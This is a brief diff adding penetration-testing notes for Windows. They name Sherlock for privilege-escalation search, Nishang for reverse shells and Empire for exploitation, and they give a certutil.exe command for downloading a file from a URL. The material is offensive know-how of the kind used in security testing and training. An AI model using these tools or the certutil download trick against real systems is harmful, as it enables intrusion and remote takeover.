@@ -1,0 +1,6 @@
+Search for priv escalation using Sherlock
+Reverse shell using Nishang
+Exploit with Empire
+
+Download file like wget:
+  certutil.exe -urlcache -split -f "url" filename
